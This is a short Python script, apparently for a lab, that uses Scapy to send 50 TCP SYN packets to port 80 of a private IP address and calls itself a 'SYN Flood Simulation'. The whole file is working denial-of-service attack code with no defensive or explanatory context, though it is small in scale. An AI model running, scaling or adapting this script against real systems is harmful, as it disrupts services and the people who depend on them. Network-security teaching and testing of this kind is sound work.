from scapy.all import IP, TCP, send
import time

TARGET_IP = "10.17.152.77"

SOURCE_PORT = 55555
DESTINATION_PORT = 80

print("[INFO] Starting SYN Flood Simulation...")

for i in range(50):

    packet = (
        IP(dst=TARGET_IP)
        /
        TCP(
            sport=SOURCE_PORT,
            dport=DESTINATION_PORT,
            flags="S"
        )
    )

    send(packet, verbose=False)

    time.sleep(0.02)

print("[INFO] SYN Flood Simulation Complete.")